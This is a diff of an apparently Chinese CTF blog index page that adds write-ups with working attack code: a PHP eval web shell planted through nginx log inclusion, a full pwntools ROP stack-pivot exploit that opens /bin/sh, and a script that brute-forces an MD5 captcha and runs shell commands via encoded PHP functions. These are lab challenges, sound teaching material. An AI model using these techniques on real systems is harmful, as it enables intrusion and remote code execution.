@@ -131,6 +131,101 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/10/13/HNCTF2022-easyInclude-wp/" >HNCTF2022-easy_include-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-10-13
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2948">题目链接</a>   </p>
+<h2 id="日志注入getshell"><a href="#日志注入getshell" class="headerlink" title="日志注入getshell"></a>日志注入getshell</h2><blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/my1e3/p/5854897.html">https://www.cnblogs.com/my1e3/p/5854897.html</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//WEB手要懂得搜索</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=/i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>明显禁用了php:&#x2F;&#x2F;和data:&#x2F;&#x2F;伪协议   那么可以用file:&#x2F;&#x2F;来查看文件</p>
+<p>由文件头可知是nginx服务器   nginx的配置文件为<code>/etc/nginx/nginx.conf</code>  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=/etc/nginx/nginx.conf</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># error_log  /var/log/nginx/error.log warn;</span></span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到日志文件位于<code>/var/log/nginx/</code>中   访问<code>/var/log/nginx/access.log</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">x.x.x.x - - [13/Oct/2023:11:18:25 +0000] &quot;GET / HTTP/1.1&quot; 200 1534 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;</span></span><br><span class="line"><span class="comment">x.x.x.x - - [13/Oct/2023:11:18:25 +0000] &quot;GET /?file=/etc/nginx/nginx.conf HTTP/1.1&quot; 200 1534 &quot;http://node5.anna.nssctf.cn:28888/&quot; &quot;Mozilla/5.0 (</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>可见成功include并获取日志内容  其中包括：IP， url路径，状态码和user-agent</p>
+<p>那么有两种方式写入木马：</p>
+<ol>
+<li><p>url <code>?file=&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code>  </p>
+<p>注意这里如果直接浏览器改url部分字符会被编码，写入日志也是编码后的结果无法生效   因此需burp抓包修改</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/10/13/HNCTF2022-easyInclude-wp/0x1.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/10/13/HNCTF2022-easyInclude-wp/0x2.png?raw=true" alt="img"></p>
+</li>
+<li><p>user-agent</p>
+<p>user-agent 直接用hackbar改也行  这里不用考虑编码问题</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/10/13/HNCTF2022-easyInclude-wp/0x3.png?raw=true" alt="img"></p>
+</li>
+</ol>
+
+	
+	</div>
+  <a type="button" href="/2023/10/13/HNCTF2022-easyInclude-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/10/10/dcquals2019-speedrun-wp/" >nightmare 7.2.1.dcquals2019-speedrun-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-10-10
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/17-stack_pivot/dcquals19_speedrun4">相关资源</a>  </p>
+<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec speedrun </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+2h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  IO_puts(<span class="string">&quot;how much do you have to say?&quot;</span>);</span><br><span class="line">  _libc_read(<span class="number">0</span>, buf, <span class="number">9uLL</span>);</span><br><span class="line">  buf[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  len = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> IO_puts(<span class="string">&quot;That&#x27;s not much to say.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">257</span> )</span><br><span class="line">    <span class="keyword">return</span> read_len((<span class="type">unsigned</span> <span class="type">int</span>)len);</span><br><span class="line">  <span class="keyword">return</span> IO_puts(<span class="string">&quot;That&#x27;s too much to say!.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果大小在1-257之内 则调用<code>read_len</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_len</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  IO_puts(<span class="string">&quot;Ok, what do you have to say for yourself?&quot;</span>);</span><br><span class="line">  _libc_read(<span class="number">0</span>, buf, a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(</span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;Interesting thought \&quot;%s\&quot;, I&#x27;ll take it into consideration.\n&quot;</span>,</span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">int</span>)buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>buf长为256  明显可以溢出一个字节到<code>old_rbp</code>  从而利用stack pivot</p>
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>将<code>old_rbp</code>最低位更改为0x00  进而ret后会跳转到0x08来执行  gdb调试分析发现多数情况下都在buf内部  也就是可以在buf内布置ROP然后跳转执行</p>
+<p>但因为没法泄露  不知道具体的写入位置   可以通过多个<code>ret</code>来到达同样的地址执行ROP</p>
+<p>因此也不是每次都能成功  有一定概率   依赖于栈顶地址</p>
+<p>还有就是没有现成的<code>/bin/sh</code>  需要自己调用read函数写到bss段上然后利用</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./speedrun&quot;</span>)</span><br><span class="line">belf = ELF(<span class="string">&quot;./speedrun&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    set env DEBUG=1</span></span><br><span class="line"><span class="string">    b * 0x0000000000400BB4</span></span><br><span class="line"><span class="string">    # b * 0x0000000000400C7A</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> + <span class="string">&#x27;c\n&#x27;</span> * <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400C46</span></span><br><span class="line">bss = <span class="number">0x6BB300</span></span><br><span class="line">syscall = <span class="number">0x000000000040132c</span></span><br><span class="line"></span><br><span class="line">rax_ret = <span class="number">0x0000000000415f04</span></span><br><span class="line">rdi_ret = <span class="number">0x0000000000400686</span></span><br><span class="line">rsi_ret = <span class="number">0x0000000000410a93</span></span><br><span class="line">rdx_ret = <span class="number">0x000000000044a155</span></span><br><span class="line">rdx_rsi_ret = <span class="number">0x000000000044c6d9</span></span><br><span class="line">ret = <span class="number">0x0000000000400416</span></span><br><span class="line">read = <span class="number">0x000000000044A140</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;say?&#x27;</span>, <span class="string">b&#x27;257&#x27;</span>)</span><br><span class="line">payload = p64(ret) * <span class="number">13</span></span><br><span class="line">payload += p64(rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_rsi_ret) + p64(<span class="number">8</span>) + p64(bss)</span><br><span class="line">payload += p64(read)</span><br><span class="line"></span><br><span class="line">payload += p64(rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(rdi_ret) + p64(bss) + p64(rdx_rsi_ret) + p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;yourself?&#x27;</span>, payload.ljust(<span class="number">257</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/10/10/dcquals2019-speedrun-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/10/10/极客大挑战2020-rceme-wp/" >极客大挑战2020-rceme-wp</a>
 								</h3>
 							</div>
@@ -145,7 +240,29 @@
   <div class="row">
 	
 	
-		
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2298">题目链接</a>   </p>
+<p>源码提示有<code>swp</code>，访问<code>.index.php.swp</code>成功下载得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>,<span class="number">5</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现有md5前5位比对校验，且当前<code>$_SESSION[&#39;code&#39;]</code>在页面中也有展现   因此可以爆破   然后就是无参函数构造了</p>
+<blockquote>
+<p>爆破哈希可以查看生日攻击：<a target="_blank" rel="noopener" href="http://ruanyifeng.com/blog/2018/09/hash-collision-and-birthday-attack.html">哈希碰撞与生日攻击 - 阮一峰的网络日志 (ruanyifeng.com)</a></p>
+<p>无参函数构造可见：<a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/09/26/HNCTF2022-Canyource-wp/">https://antel0p3.github.io/2023/09/26/HNCTF2022-Canyource-wp/</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">one</span>(<span class="params">s</span>):		</span><br><span class="line">    ss = <span class="string">b&quot;[~&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += (<span class="number">255</span> - <span class="built_in">ord</span>(each)).to_bytes(<span class="number">1</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    ss += <span class="string">b&quot;][~\xCF](&quot;</span></span><br><span class="line">    <span class="keyword">return</span> ss</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_not</span>(<span class="params">a</span>):	<span class="comment"># 将命令转为[~\x8F\x8D\x96\x91\x8B\xA0\x8D][~\xCF]();的形式</span></span><br><span class="line">    aa = a.split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    s = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> aa[:-<span class="number">1</span>]:</span><br><span class="line">        s += one(each)</span><br><span class="line">    s += <span class="string">b&quot;)&quot;</span> * (<span class="built_in">len</span>(aa) - <span class="number">1</span>) + <span class="string">b&quot;;&quot;</span></span><br><span class="line">    <span class="comment"># print(s)</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28583/&#x27;</span></span><br><span class="line">sess = requests.session()	<span class="comment"># 注意这里用session()是为了保持会话状态</span></span><br><span class="line">res = sess.get(url=url)</span><br><span class="line"><span class="built_in">sum</span> = re.findall(<span class="string">&#x27;,0,5[)]==(.....)&#x27;</span>, res.text)[<span class="number">0</span>]	<span class="comment"># 获取5位哈希值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;&#x27;</span>	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">800000</span>):	<span class="comment"># 爆破  不成功多试几次</span></span><br><span class="line">    md5 = hashlib.md5(<span class="built_in">str</span>(i).encode())</span><br><span class="line">    <span class="keyword">if</span> md5.hexdigest()[:<span class="number">5</span>] == <span class="built_in">sum</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        code = i</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = sess.post(url=url, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;phpinfo();&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>成功获取到phpinfo结果  渲染后查看  <code>disabled_functions</code>中没有禁用函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">res = sess.post(url=url, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;print_r(getallheaders());&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># Array (</span></span><br><span class="line"><span class="comment">#    [Host] =&gt; node4.anna.nssctf.cn:28583</span></span><br><span class="line"><span class="comment">#    [User-Agent] =&gt; python-requests/2.31.0</span></span><br><span class="line"><span class="comment">#    ...)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ls&quot;</span>&#125;	<span class="comment"># 这里放要执行的命令</span></span><br><span class="line">res = sess.post(url=url, headers=headers, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;print_r(getallheaders());&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># Array (</span></span><br><span class="line"><span class="comment">#    [Host] =&gt; node4.anna.nssctf.cn:28583</span></span><br><span class="line"><span class="comment">#    [User-Agent] =&gt; ls</span></span><br><span class="line"><span class="comment">#    ...)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ls&quot;</span>&#125;</span><br><span class="line">res = sess.post(url=url, headers=headers, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;print_r(next(getallheaders()));&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># ls</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ls /;cat /fll*&quot;</span>&#125;</span><br><span class="line">res = sess.post(url=url, headers=headers, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;system(next(getallheaders()));&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># flll1114gggggg ...</span></span><br></pre></td></tr></table></figure>
+
+
 	
 	</div>
   <a type="button" href="/2023/10/10/极客大挑战2020-rceme-wp/#more" class="btn btn-default more">Read More</a>
@@ -597,115 +714,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/09/16/HCTF2018-theEnd-wp/" >HCTF2018-the_end-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-09-16
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end/">相关资源</a>  </p>
-<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec the_end </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-
-<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span 